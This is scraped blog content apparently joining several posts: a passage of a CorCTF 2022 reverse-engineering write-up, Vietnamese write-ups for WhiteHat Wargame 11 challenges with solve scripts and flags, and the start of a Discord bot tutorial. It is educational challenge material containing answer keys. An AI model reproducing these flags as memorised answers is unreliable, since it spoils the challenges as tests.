74010334h 001000D4 dd 9F168D0Ah, 0B421CD03h, 8D21CD4Ch, 0CD033616h, 0CD4CB421h 00100110 db 21h Switching to reading the code, we get the following\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 001000C2 mov ah, 0Ah 001000C4 lea edx, [esi] 001000C6 adc [edx], eax 001000C8 mov byte ptr [esi], 11h 001000CB add bh, bh 001000CD mov byte ptr [esi], 12h 001000D0 add bh, bh 001000D2 int 21h ; DOS - BUFFERED KEYBOARD INPUT 001000D2 ; DS:DX -\u0026gt; buffer 001000D4 xor esi, esi 001000D6 001000D6 loc_1000D6: ; CODE XREF: 001000EA↓j 001000D6 cmp esi, 12h 001000D9 jz short loc_1000EC 001000DB mov al, [ebx+edx-75F2CBFEh] 001000E2 pushf 001000E3 and al, [ebx] 001000E5 cmp al, bl 001000E7 jnz short loc_1000F2 001000E9 inc esi 001000EA jmp short loc_1000D6 001000EC ; --------------------------------------------------------------------------- 001000EC 001000EC loc_1000EC: ; CODE XREF: 001000D9↑j 001000EC mov dword ptr [esi], 10334h 001000F2 001000F2 loc_1000F2: ; CODE XREF: 001000E7↑j 001000F2 xor ebx, ebx 001000F4 mov ah, 9 001000F6 cmp dword ptr [esi], 34h ; \u0026#39;4\u0026#39; 001000F9 add eax, [ecx] 001000FB jz short near ptr loc_100102+5 001000FD lea edx, [esi] 001000FF lahf 00100100 add ecx, ebp 00100102 00100102 loc_100102: ; CODE XREF: 001000FB↑j 00100102 and [esp+ecx*2+168D21CDh], esi 00100109 db 36h 00100109 add ecx, ebp Combined with assigning 0xd to edx, perhaps this half of the flag will do something with 0xd\nMaybe i though too much (just xor with 0xd)\nflag: corctf{3mbr4c3,3xt3nd,3Xt1ngu15h!!1}\nturbocrab Description: 🚀🚀 blazinglyer faster 🚀🚀 SHA256 hash of the flag: dc136f8bf4ba6cc1b3d2f35708a0b2b55cb32c2deb03bdab1e45fcd1102ae00a\nCheck the file Setup and run file:\nWhen i load turbocrab into IDA64\nLooking at this decompiled rust, I came up with the idea of ​​searching the string from the previous check flag section to find the function 🤡\nfunction turbocrab::execute_shellcode::h6984ce5848b31780:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 void __cdecl turbocrab::execute_shellcode::h6984ce5848b31780(__u8_ shellcode) { __u8_ v1; // rdi __int64 v2; // r15 __int64 v3; // rdx usize v4; // [rsp+8h] [rbp-190h] u8 *v5; // [rsp+10h] [rbp-188h] usize len; // [rsp+20h] [rbp-178h] __int64 count; // [rsp+28h] [rbp-170h] core::ffi::c_void *src; // [rsp+30h] [rbp-168h] core::ffi::c_void *dst; // [rsp+48h] [rbp-150h] _BYTE v10[29]; // [rsp+63h] [rbp-135h] BYREF alloc::vec::Vec\u0026lt;u8,alloc::alloc::Global\u0026gt; self; // [rsp+80h] [rbp-118h] BYREF u8 *v12; // [rsp+98h] [rbp-100h] __int64 v13; // [rsp+A0h] [rbp-F8h] BYREF core::fmt::Arguments v14; // [rsp+A8h] [rbp-F0h] BYREF core::fmt::Arguments v15; // [rsp+D8h] [rbp-C0h] BYREF __u8_ v16; // [rsp+108h] [rbp-90h] core::ffi::c_void *v17; // [rsp+118h] [rbp-80h] __int64 *v18; // [rsp+130h] [rbp-68h] __int64 v19; // [rsp+138h] [rbp-60h] __int64 v20; // [rsp+140h] [rbp-58h] __int64 v21; // [rsp+148h] [rbp-50h] core::ffi::c_void *v22; // [rsp+150h] [rbp-48h] core::ffi::c_void *v23; // [rsp+158h] [rbp-40h] __int64 v24; // [rsp+160h] [rbp-38h] __int64 v25; // [rsp+168h] [rbp-30h] u8 *v26; // [rsp+170h] [rbp-28h] __int64 v27; // [rsp+178h] [rbp-20h] u8 *v28; // [rsp+180h] [rbp-18h] v16 = shellcode; v25 = 0LL; dst = mmap(0LL, shellcode.length, 3, 33, -1, 0LL); v17 = dst; qmemcpy(v10, \u0026#34;R^CRIWJM\u0026lt;6.[5I.G`.C3G3CB5_V?P\u0026#34;, sizeof(v10)); alloc::vec::from_elem::hba0d51ad3cb1207d(\u0026amp;self, 0, 0x4000uLL); v26 = alloc::vec::Vec$LT$T$C$A$GT$::as_ptr::h0252951c7d91d004(\u0026amp;self); v27 = 49602LL; v28 = v26 + 49602; v12 = v26 + 49602; src = core::slice::_$LT$impl$u20$$u5b$T$u5d$$GT$::as_ptr::h869fdf96852d8c48(shellcode); count = core::slice::_$LT$impl$u20$$u5b$T$u5d$$GT$::len::h00af0a2d7a9c0658(shellcode); v22 = dst; v23 = src; v24 = count; core::intrinsics::copy::h46e3e522e297e890(src, dst, count); len = core::slice::_$LT$impl$u20$$u5b$T$u5d$$GT$::len::h00af0a2d7a9c0658(shellcode); mprotect(dst, len, 5); v13 = v20; v18 = \u0026amp;v13; v1.data_ptr = v10; v1.length = 29LL; v5 = core::slice::_$LT$impl$u20$$u5b$T$u5d$$GT$::as_ptr::h869fdf96852d8c48(v1); v1.data_ptr = v10; v1.length = 29LL; v4 = core::slice::_$LT$impl$u20$$u5b$T$u5d$$GT$::len::h00af0a2d7a9c0658(v1); v2 = v12; v13 = (dst)(v10, 29LL, v3, dst, v5, v4); v12 = v2; v19 = v13; v21 = v13; if ( v13 == 1 ) core::fmt::Arguments::new_v1::h610d7aa66ccb1a0c(\u0026amp;v14, __PAIR128__(1LL, \u0026amp;stru_5620902FFF78), \u0026amp;stru_562090296240); else core::fmt::Arguments::new_v1::h610d7aa66ccb1a0c(\u0026amp;v15, __PAIR128__(1LL, \u0026amp;stru_5620902FFF68), \u0026amp;stru_562090296240); std::io::stdio::_print::hccc6c4adfff98fee(); core::ptr::drop_in_place$LT$alloc..vec..Vec$LT$u8$GT$$GT$::h34608ea8b4b90afb(\u0026amp;self); } My conclusion here is:\nR^CRIWJM\u0026lt;6.[5I.G`.C3G3CB5_V?P looks like it\u0026rsquo;s been encrypted\nshellcode and source dst are unknown v13 == 1 --\u0026gt; Correct! and vice versa\nDebugging Setup virtual machine for debugging with breakpoint set at v13 = (dst)(v10, 29LL, v3, dst, v5, v4);\nStep into continuously and when it comes to call close ptr unk_7F8C04CC62B2 there is a section LINUX-sys_read \u0026ndash;\u0026gt; Interrupt for input, we will see the section after that will have the input you entered and also the local encoding flag\nContinue and understand that the flow of the program is xor with 13 then sub with 1Eh (each character) like the asm fragment below:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 zero:00007FE17840D120 loc_7FE17840D120: ; CODE XREF: zero:00007FE17840D06F↑j zero:00007FE17840D120 mov rax, r9 zero:00007FE17840D123 xor rax, r9 zero:00007FE17840D126 mov r9, rax zero:00007FE17840D129 mov al, [r8] zero:00007FE17840D12C mov r9b, al zero:00007FE17840D12F mov al, r9b zero:00007FE17840D132 xor al, 13h zero:00007FE17840D134 mov r9b, al zero:00007FE17840D137 pushfq zero:00007FE17840D138 mov al, r9b zero:00007FE17840D13B mov rbx, rax zero:00007FE17840D13E mov al, 80h zero:00007FE17840D140 mov rcx, 2 zero:00007FE17840D14A cmp rbx, rax zero:00007FE17840D14D jz short loc_7FE17840D158 zero:00007FE17840D14F sbb rcx, rcx zero:00007FE17840D152 and ecx, 0FFFFFFFDh zero:00007FE17840D155 add ecx, 4 zero:00007FE17840D158 zero:00007FE17840D158 loc_7FE17840D158: ; CODE XREF: zero:00007FE17840D14D↑j zero:00007FE17840D158 mov r14, rcx zero:00007FE17840D15B popfq zero:00007FE17840D15C mov rax, r14 zero:00007FE17840D15F and al, 4 zero:00007FE17840D161 test al, al zero:00007FE17840D163 jz short loc_7FE17840D16D zero:00007FE17840D165 mov al, r9b zero:00007FE17840D168 xor al, 37h zero:00007FE17840D16A mov r9b, al zero:00007FE17840D16D zero:00007FE17840D16D loc_7FE17840D16D: ; CODE XREF: zero:00007FE17840D163↑j zero:00007FE17840D16D mov al, r9b zero:00007FE17840D170 sub al, 1Eh zero:00007FE17840D172 mov r9b, al zero:00007FE17840D175 pushfq zero:00007FE17840D176 mov al, r9b zero:00007FE17840D179 mov rbx, rax zero:00007FE17840D17C mov al, 10h zero:00007FE17840D17E mov rcx, 2 zero:00007FE17840D188 cmp rbx, rax zero:00007FE17840D18B jz short loc_7FE17840D196 zero:00007FE17840D18D sbb rcx, rcx zero:00007FE17840D190 and ecx, 0FFFFFFFDh zero:00007FE17840D193 add ecx, 4 zero:00007FE17840D196 zero:00007FE17840D196 loc_7FE17840D196: ; CODE XREF: zero:00007FE17840D18B↑j zero:00007FE17840D196 mov r14, rcx zero:00007FE17840D199 popfq zero:00007FE17840D19A mov rax, r14 zero:00007FE17840D19D and al, 3 zero:00007FE17840D19F test al, al zero:00007FE17840D1A1 jz short loc_7FE17840D1AB zero:00007FE17840D1A3 mov al, r9b zero:00007FE17840D1A6 xor al, 31h zero:00007FE17840D1A8 mov r9b, al zero:00007FE17840D1AB zero:00007FE17840D1AB loc_7FE17840D1AB: ; CODE XREF: zero:00007FE17840D1A1↑j zero:00007FE17840D1AB mov al, r9b zero:00007FE17840D1AE mov [r8], al zero:00007FE17840D1B1 mov rax, [r15] zero:00007FE17840D1B4 add r15, 8 zero:00007FE17840D1B8 jmp rax Solve Script 1 2 3 encrypt = b\u0026#34;R^CRIWJM\u0026lt;6.[5I.G`.C3G3CB5_V?P\u0026#34; for i in encrypt: print(chr((i + 0x1e) ^ 0x13), end = \u0026#34;\u0026#34;) \u0026ndash;\u0026gt; corctf{xIG_j@t_vm_rBvBrs@ngN}\nIt seems that the flag still has no meaning, but now I notice the sha256 part in the Description: dc136f8bf4ba6cc1b3d2f35708a0b2b55cb32c2deb03bdab1e45fcd1102ae00a\nI can only think of one direction: bruteforce until the two sha256 codes are the same, then initial flag with some identifiable characteristics to save time such as: B can be 3, e or E and @ can be 1, i, I or !.\nBased on those, we can write a script to get the flag:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 import hashlib target_hash = \u0026#34;dc136f8bf4ba6cc1b3d2f35708a0b2b55cb32c2deb03bdab1e45fcd1102ae00a\u0026#34; characters = \u0026#34;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ,.!?;:\u0026#39;-()[]{}\u0026lt;\u0026gt;\\/@#$%^\u0026amp;*_+=\u0026#34; guess1 = [\u0026#34;1\u0026#34;, \u0026#34;i\u0026#34;, \u0026#34;I\u0026#34;, \u0026#34;!\u0026#34;] guess2 = [\u0026#34;3\u0026#34;, \u0026#34;e\u0026#34;, \u0026#34;E\u0026#34;] for i in range(len(characters)): for j in range(len(characters)): for k in range(len(guess1)): for l in range(len(guess2)): for m in range(len(characters)): candidate = f\u0026#34;corctf{{x{characters[i]}{characters[j]}_j{guess1[k]}t_vm_r{guess2[l]}v{guess2[l]}rs{guess1[k]}ng{characters[m]}}}\u0026#34; hashed = hashlib.sha256(candidate.encode(\u0026#39;utf-8\u0026#39;)).hexdigest() if hashed == target_hash: print(\u0026#34;Found:\u0026#34;, candidate) break flag:corctf{x86_j1t_vm_r3v3rs1ng?}\n","date":"2022-08-09T00:00:00Z","image":"/p/corctf-2022-reverse-engineering/featured-image_huc527355a429b7d0660ac9e16fd98331c_24593_120x120_fill_box_smart1_3.png","permalink":"/p/corctf-2022-reverse-engineering/","title":"CorCTF 2022 | Reverse Engineering"},{"content":"MISC Discord check Flag được ghim ở Annoucements\nflag: WhiteHat{Ready_for_WhiteHatPlay11_Ready_for_a_vibrant_summer}\nAudio Ở bài này chúng ta sẽ nhận được 1 file wav (file âm thanh). Ta tiến hành mở file bằng Audacity\nChuyển qua xem dưới dạng ảnh phổ ta được:\nSử dụng cài đặt ảnh phổ và điều chỉnh thông số sao cho phù hợp, hoặc lăn chuột để phổ giãn đều:\n-–\u0026gt; 3u1b_51_n0dn01 (ở đây vẫn chẳng có nghĩa gì)\nXem lại hint của đề bài: A big football team in London \u0026ndash;\u0026gt; Đảo ngược lại cụm ở trên ta được flag\nflag: WhiteHat{10nd0n_15_b1u3}\nREVERSE ENGINEERING WhiteHatPlay11v1 Load file vào IDA, để ý _main\nở đây có hàm sub_4010A0, sub_401190 và sub_401440 là đáng chú ý, kiểm tra từng hàm một\nsub_4010A0\nTới đây thì có byte_40EFB0 là không rõ ràng, tìm hiểu sâu vào\nĐể ý kỹ 1 chút ở ngay bên dưới thì có xuất hiện đặc điểm của base85\nsub_401190\nThấy có byte_410F0C, kiểm tra thì có\nĐến đây là đã xong, dịch base85 bằng cyberchef\nflag: Whit3H4t11H4v34N1C3D4yR3VeRs31!\nBài này chắc là vì lý do chỉ có click\u0026amp;click nên số sao dành tặng cho chall chỉ là 2/5\nWhiteHatPlay11v2 Mở file .dll nhận được bằng IDA\nHàm WhiteHat()\n1 số điều cần chú ý ở hàm đặc biệt này:\nbiến local:\ncheck biến vào:\nLABEL_6:\nLABEL_41\nChức năng\nTại LABEL_6:\nstrncpy_s(Destination, 260u, Str, 36u); và v4 = Destination; sẽ hiểu là biến v4 = Destination sẽ lấy 36 ký tự đầu của Str\nMột phần nữa là QDIwMjI= base64 là @2022 sẽ là 5 ký tự cuối của flag\nHàm check 36 ký tự đầu của input và đối chiếu với flag:\nmặt khác lại có các byte tương ứng để đối chiếu\nTheo mình hiểu code sẽ là qua hàm lấy từng ký tự của input xor với\nĐể ý call ngay trước 5 byte cuối sẽ là hàm sub_10001EC0 xử lý 36 byte đầu của input\nHàm này có công dụng gọi 36 byte đầu của input và mỗi ký tự khi gọi sẽ được xor với 0x11 (^ 0x11) và sau đó cộng với 11\nViết script:\n1 2 3 4 decode = [0x70, 0x83, 0x84, 0x51, 0x70, 0x30, 0x64, 0x2D, 0x2C, 0x4D, 0x2B, 0x2B, 0x2D, 0x72, 0x2B, 0x68, 0x82, 0x83, 0x68, 0x30, 0x6F, 0x2C, 0x53, 0x7F, 0x88, 0x88, 0x2B, 0x51, 0x7F, 0x87, 0x2D, 0x4E, 0x6E, 0x2D, 0x5E, 0x87] for i in range(0, len(decode)): print(chr((decode[i] - 11) ^ 0x11), end =\u0026#34;\u0026#34;) Nhưng có vẻ chưa ổn lắm vì bị ngược (sau 4 byte nó tự đổi)\nWhit3H4t \u0026ndash;\u0026gt; tihWt4H3\nScript giải\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 decode = [0x70, 0x83, 0x84, 0x51, 0x70, 0x30, 0x64, 0x2D, 0x2C, 0x4D, 0x2B, 0x2B, 0x2D, 0x72, 0x2B, 0x68, 0x82, 0x83, 0x68, 0x30, 0x6F, 0x2C, 0x53, 0x7F, 0x88, 0x88, 0x2B, 0x51, 0x7F, 0x87, 0x2D, 0x4E, 0x6E, 0x2D, 0x5E, 0x87] x = [] for i in range(0, len(decode)): x += (chr((decode[i] - 11) ^ 0x11)) # dịch các ký tự for i in range(0, len(decode), 4): # đổi chỗ các ký tự tmp1 = x[i] x[i] = x[i+3] x[i+3] = tmp1 # Đổi thứ tự 1, 4 --\u0026gt; 4, 1 tmp2 = x[i+1] x[i+1] = x[i+2] x[i+2] = tmp2 # đổi thứ tự 2, 3 --\u0026gt; 3, 2 print(*x, sep = \u0026#34;\u0026#34;) flag: WhiteHat{Whit3H4t11S0L1v34LifeY0uW1llR3memB3r}\nBài này mình thấy khá hay nhưng sao lại ít sao thế nhỉ? (1/5 sao)\nstartr3 Với bài này mở file bằng ida64 \u0026ndash;\u0026gt; free flag\nflag: WhiteHat{start_r3_ez_game}\n:))) mà cũng chẳng hiểu sao bài này lại là bài re3 mà lại còn 3 sao\nBaby RE Nhìn file tải về là biết nó liên quan đến python, là 1 người chơi rev chắc hẳn sẽ biết đến pyc (đã từng được mình nhắc đến trong chall của BlueHens)\nSau một hồi loay hoay thì mình tìm được tool để decompile file này là pyinstxtractor\nSau khi chạy pyinstxtractor:\nVà ra file quewridg.pyc, sử dụng Uncompyle6 hoặc Decompiler Tools\nCode\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 # uncompyle6 version 3.7.4 # Python bytecode 3.7 (3394) # Decompiled from: Python 2.7.17 (default, Sep 30 2020, 13:38:04) # [GCC 7.5.0] # Warning: this version of Python has problems handling the Python 3 \u0026#34;byte\u0026#34; type in constants properly. # Embedded file name: quewridg.py import base64, os, time str1 = [] str2 = [] k = None h = None def re(): global h global k s = \u0026#39;VOhEdHV0YIRVVLF0S9\u0026#39; x = \u0026#39;92Mp5GXI5XV79DMO1F\u0026#39; for i in range(len(s)): if i % 2 != 0: str1.append(s[i]) str2.append(x[i]) else: str1.append(x[i]) str2.append(s[i]) k = \u0026#39;\u0026#39;.join(str1) h = \u0026#39;\u0026#39;.join(str2) def write_1(): with open(os.environ[\u0026#39;USERPROFILE\u0026#39;] + str(base64.b64decode(\u0026#39;XEFwcERhdGFcTG9jYWxcVGVtcFw=\u0026#39;), \u0026#39;utf-8\u0026#39;) + k + str(base64.b64decode(\u0026#39;LnR4dA==\u0026#39;), \u0026#39;utf-8\u0026#39;), \u0026#39;w\u0026#39;) as (f): f.write(\u0026#39;YmFuIGNvIHRoYXkgY29uIGJhY2ggdHVvYyBrZXUga2hvbmc=\u0026#39;) with open(os.environ[\u0026#39;USERPROFILE\u0026#39;] + str(base64.b64decode(\u0026#39;XEFwcERhdGFcUm9hbWluZ1w=\u0026#39;), \u0026#39;utf-8\u0026#39;) + h + str(base64.b64decode(\u0026#39;LnR4dA==\u0026#39;), \u0026#39;utf-8\u0026#39;), \u0026#39;w\u0026#39;) as (f): f.write(\u0026#39;dGltIHRodSB4ZW0=\u0026#39;) def content(): banner = \u0026#34;.__ __. __ ______ ___ .___________.____ _ _ .___ ___. \\n| \\\\ | | /_ | / | / _ \\\\ | |___ \\\\ | || | | \\\\/ | \\n| \\\\| | | | | ,----\u0026#39;| | | | `---| |----` __) | | || |_ | \\\\ / | \\n| . ` | | | | | | | | | | | |__ \u0026lt; |__ _| | |\\\\/| | \\n| |\\\\ | | | | `----.| |_| | | | ___) | | | | | | | \\n|__| \\\\__| |_| \\\\______| \\\\___/ |__| |____/ |_| |__| |__|\u0026#34; print(banner) print(\u0026#39;=======================================================================================\u0026#39;) print(\u0026#39; https://www.youtube.com/shorts/t1u-h4rlNSY \u0026#39;) print(\u0026#39;=======================================================================================\u0026#39;) time.sleep(5) if __name__ == \u0026#39;__main__\u0026#39;: content() re() write_1() Đọc code thì có thể thấy ở hàm write_1() chỉ là sử dụng base64 để đánh lừa, khi biên dịch ra thực chất chỉ là tạo file và điền vào đó vài cụm từ vô nghĩa với mục đích chúng ta cần, hàm content()\nVậy ở đây chắc chỉ dùng được hàm re()\nta thấy h và k đã được trải qua nhiều lệnh nhưng lại không để làm gì nên sẽ in ra xem nó sẽ làm gì\nKhi in ra thì h = V2hpdGVIYXR7VDFOSF và k = 9OME5HX05IVV9LM019\nDịch thử base64\nflag: WhiteHat{T1NH_N0NG_NHU_K3M}\nCó lẽ tác giả ra đến đây bí ý tưởng :)) chứ không thể xàm như này được\nflagcheck Check main:\nQua check hàm main thì dễ thấy hàm này đơn giản là cho 1 dãy ký tự đầu vào, sau đó chúng ta phải nhập flag và hàm này sẽ check từng ký tự rồi xor với số thứ tự của chúng (đã cộng thêm 1)\nVà sau đó so sánh bộ ký tự mới được in ra và bộ ký tự ban đầu cho, vậy nên đến đây có thể viết script để có được flag\ncode:\n1 2 3 encode_flag = \u0026#34;Vjjp`Nf|roqSua}Ow}aKg%H{q{wpxpxE~mLTX\u0026#34; for i in range(len(encode_flag)): print(chr(ord(encode_flag[i]) ^ (i + 1)), end =\u0026#34;\u0026#34;) flag: WhiteHat{ez_xor_for_r3_challenge_Oop}\nCRYPTOGRAPHY b64\u0026amp;xor Đề bài cho 1 đoạn base64 dịch sang thì thành 1 đoạn không hề có nghĩa gì lắm\nMà đề bài lại là xor\u0026amp;b64 nhưng lại chẳng cho thứ cần xor là gì nên mình nghĩ sẽ check thử với format của đề bài: WhiteHat{\nvà sau vài lần thử thì mình đã thành công bằng việc chuyển đoạn cipher ban đầu từ base64 decode ra về byte rồi xor với các byte của format đề\n1 2 3 4 5 6 7 8 9 10 11 import base64 if __name__ == \u0026#34;__main__\u0026#34;: coded_string = \u0026#34;NFwcKxN4DxMGLVxFABUAADgQFgAqMgNRMQ89PAAbNyldXg4iF1xBJik=\u0026#34; format_flag = \u0026#34;WhiteHat{\u0026#34; flag = [] y = bytes(format_flag, \u0026#39;utf-8\u0026#39;) x = base64.b64decode(coded_string) for i in range(0,9): j = 0 print((chr(x[i] ^ y[i])), end =\u0026#34;\u0026#34;) Đoạn này ra tương ứng với c4u_v0ng}, mình thử thêm nhiều WhiteHat{ nữa vào format flag và nó trả về như này\nKhông có ý nghĩa gì lắm nên trở lại thì mình chợt nghĩ ra, nếu xor từ WhiteHat{ thành được c4u_v0ng} vậy thì từ c4u_v0ng} cũng về được WhiteHat{ và mục tiêu bây giờ chỉ cần kiếm cái đoạn đằng sau cái WhiteHat{ đó bằng cách mình thêm rất nhiều cụm c4u_v0ng} vào format_flag\n1 2 3 4 5 6 7 8 9 10 11 import base64 if __name__ == \u0026#34;__main__\u0026#34;: coded_string = \u0026#34;NFwcKxN4DxMGLVxFABUAADgQFgAqMgNRMQ89PAAbNyldXg4iF1xBJik=\u0026#34; format_flag = \u0026#34;c4u_v0ng}c4u_v0ng}c4u_v0ng}c4u_v0ng}c4u_v0ng}c4u_v0ng}c4u_v0ng}c4u_v0ng}\u0026#34; flag = [] y = bytes(format_flag, \u0026#39;utf-8\u0026#39;) x = base64.b64decode(coded_string) for i in range(0,41): j = 0 print((chr(x[i] ^ y[i])), end =\u0026#34;\u0026#34;) flag: WhiteHat{Nh0_c0n_mu4_mua_h@_4nh_m0i_th4y_c4u_v0ng}\nProgrammer 1 2 3 4 5 6 7 8 9 10 11 12 13 from secret import flag def cal_flag(flag): output=[] for i in range(len(flag)): temp = ord(flag[i])**17%3233 output.append(temp) print(output) if __name__ == \u0026#39;__main__\u0026#39;: cal_flag(flag) #[604, 2170, 3179, 884, 1313, 3000, 1632, 884, 855, 3179, 119, 1632, 2271, 119, 612, 2412, 2185, 2923, 2412, 1632, 2271, 2271, 1313, 2412, 119, 3179, 119, 2170, 1632, 2578, 1313, 119, 2235, 2185, 119, 745, 3179, 1369, 1313, 1516] Đọc kỹ đề có thể thấy từ việc ta có 1 flag cho sẵn của đề –\u0026gt; ta sẽ biến đổi từng phần tử flag qua hàm cal_flag bằng cách với mỗi ký tự của flag vào sẽ được mũ 17 lên và lấy phần dư với 3233\nTa tiến hành viết lại code để chuyển đổi từng số trong output trở lại thành flag\nDo mình cũng không biết có cách nào hay hơn nên mình chỉ đơn giản là bruteforce cái encode đó về lại thành flag với cấu trúc lệnh duy nhất là **17%3233 (với mỗi ký tự thuộc khoảng (0, 127) sẽ cho qua lệnh để xem nó có phải là ký tự của encode tương ứng không)\ncode:\n1 2 3 4 5 6 7 encode = [604, 2170, 3179, 884, 1313, 3000, 1632, 884, 855, 3179, 119, 1632, 2271, 119, 612, 2412, 2185, 2923, 2412, 1632, 2271, 2271, 1313, 2412, 119, 3179, 119, 2170, 1632, 2578, 1313, 119, 2235, 2185, 119, 745, 3179, 1369, 1313, 1516] for i in encode: for x in range(0, 127): if ((x**17 % 3233) == i): print(chr(x), end=\u0026#34;\u0026#34;) flag: WhiteHat{i_am_programmer_i_have_no_life}\nDIGITAL FORENSICS Corrupt Đầu tiên chúng ta sẽ nhận được 1 file .png mở lên thì thấy không được :3\nkiểm tra hex của nó thì cũng thấy lạ vì không trùng với magic bytes phổ biến nào (các hex đầu)\nVà phía sau đoạn hex đó lại có 1 số đoạn strings quen thuộc như .png, IHDR, IDAT nên mình nghĩ tác giả cố tình chèn 1 vài đoạn strings lạ vào để đánh lừa và thực ra file này ban đầu là 1 ảnh PNG thật, việc của chúng ta bây giờ chỉ cần sửa lại các hex để đưa ra ảnh đúng\nỞ đây mình sử dụng bless để thay đổi các hex trong file ảnh PNG này\nỞ đây có lẽ mình sẽ xoá hết các hex không liên quan đoạn đằng trước .png và sau đó đổi .png thành .PNG bằng cách chuyển bộ số hex từ 89 70 6E 67 thành 89 50 4e 47 tương ứng .png \u0026ndash;\u0026gt; .PNG\nCheck thấy IHDR và IDAT đã đúng\nVì tiêu đề PNG có End Of Line cụ thể được nhận dạng trên Linux. Tiêu đề PNG ban đầu của file Corrupt là 89 50 4E 47 0D 1A 0A 1A và mình sẽ sửa thành 89 50 4E 47 0D 0A 1A 0A\nGiải thích:\n89 có bit cao được đặt để phát hiện các hệ thống truyền dẫn không hỗ trợ dữ liệu 8 bit và để giảm khả năng tệp văn bản bị hiểu nhầm là PNG hoặc ngược lại. 50 4E 47 Trong ASCII, các chữ cái PNG, cho phép một người dễ dàng xác định định dạng nếu nó được xem trong trình soạn thảo văn bản. 0D 0A\tMột dòng kiểu DOS kết thúc ( CRLF ) để phát hiện chuyển đổi kết thúc dòng DOS-Unix của dữ liệu. 1A Một byte dừng hiển thị tệp trong DOS khi loại lệnh đã được sử dụng — ký tự cuối tệp. 0A Một dòng kiểu Unix kết thúc ( LF ) để phát hiện chuyển đổi kết thúc dòng Unix-DOS. Lưu lại và chúng ta sẽ thấy sự khác biệt, bình thường sau bước này mình sẽ check thêm bằng pngcheck để xem có lỗi thêm gì không và ở đây may mắn là không lỗi\n\u0026ndash;\u0026gt; có ảnh ban đầu:\nTry hard vẽ lại bằng pixel cái QR: thì ở các phần bị thiếu sẽ bổ sung được vài thứ quan trọng\nGiải thích: Do sau khi nhập các phần viền của các phần ô vuông, thì nó tự nhận diện và fill nốt cái viền còn lại\nQuét cái QR bên trên thì ra flag\nflag: WhiteHat{4a5y_W4rmup_ch4lleng3_f0r_SUMMER_RACEEE}\nOSINT Summer vacation: Flight Flight Flight Incent Eva went to Hanoi with her friend. I am very curious about her friend and flight information. Help me. Flag fomat: WhiteHat{NAME_FLIGHT_SEAT_DATE} osint02 can be solved before osint01.\nĐề bài có nhắc tới 1 nhân vật Incent Eva –\u0026gt; nghĩ tới việc sử dụng 1 vài công cụ osint để tìm ra các tài khoản mạng xã hội của người này.\nSau khi thử, đã tìm được tài khoản twitter có username: @incent_eva\nChuyển sang mục Likes, ta thấy có 1 tài khoản khác xuất hiện –\u0026gt; @vy_tran_11\nCheck thử link trong trang cá nhân của người kia, và sau khi check ảnh trong page người đó, ta được:\nflag: WhiteHat{VYTRAN_VJ375_3F_30MAR}\nAdultery I A client hired me as a private investigator to track down her husband, Cuming Brian, because she suspected him of having an affair. Check out his social media accounts to see if there\u0026rsquo;s anything interesting\nĐề bài có nhắc đến 1 nhân vật là Cuming Brian, thì theo thói quen chúng ta cứ tìm kiếm trên instagram hoặc twitter thanh niên này thì có kết quả\nflag: WhiteHat{N3xt_p4rt_1S_h@rd3r_g0_9o_bruh}\n","date":"2022-07-01T00:00:00Z","image":"/p/wargame-whitehat-11-writeups/featured_hube26ae2df264f2ab1d9a8765d78c4ec7_187143_120x120_fill_box_smart1_3.png","permalink":"/p/wargame-whitehat-11-writeups/","title":"Wargame Whitehat 11 | Writeups"},{"content":"Create Bot Discord \u0026amp; basic config Use DEVELOPER PORTAL to create Bot We can use DEVELOPER PORTAL during the process of creating and using the Bot\nSelect New Application to create a completely new Discord Bot\nAfter successfully creating the Bot, the next step is to configure the Bot to run normally\nToken Bot Instructions: Bot -\u0026gt; Reset Token In addition to basic operations such as changing the name of the Bot, changing the avatar of the Bot,\u0026hellip; there is also a notable item is Token (click on Reset Token to display Token for first use)\nCode base for Discord Bot Main code The main python code will look like this (basic for the Bot to work properly)\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 import discord from discord.ext import commands Bot = commands.Bot(command_prefix=\u0026#34;/\u0026#34;, description=description, intents=intents) @Bot.event async def on_ready(): print(f\u0026#39;Bot is ready. Log in as: {Bot.user.name}\u0026#39;) @Bot.command() async def xinchao(ctx): await ctx.send(\u0026#39;Hello!\u0026#39;) Bot.run(\u0026#39;YOUR_TOKEN\u0026#39;) Name this code main.py for the system that uses it\nNote: YOUR_TOKEN is the Token you just received above\nKeep Alive In order for the Bot to work and check that it works, you need to ping it so that the Bot server can run normally\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 from flask import Flask from threading import Thread app = Flask(\u0026#39;\u0026#39;) @app.route(\u0026#39;/\u0026#39;) def home(): return \u0026#34;ping me every time!!!\u0026#34; def run(): app.run(host=\u0026#39;0.0.0.0\u0026#39;, port=8080) def keep_alive(): t = Thread(target=run) t.start() Name the code keep_alive.py along with the directory containing main.py\nAfter you have wrote the keep_alive.py code, you need to integrate it with main.py so that when you run main.py it will also run.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 import discord from discord.ext import commands from keep_alive import keep_alive keep_alive() Bot = commands.Bot(command_prefix=\u0026#34;/\u0026#34;, description=description, intents=intents) @Bot.event async def on_ready(): print(f\u0026#39;Bot is ready. Log in as: {Bot.user.name}\u0026#39;) @Bot.command() async def xinchao(ctx): await ctx.send(\u0026#39;Hello!\u0026#39;) Bot.run(\u0026#39;YOUR_TOKEN\u0026#39;) Host Bot on Replit Let\u0026rsquo;s talk a little bit about Replit, this is a very good online IDE that supports many programming languages ​​(I often use python here for the purpose of being able to 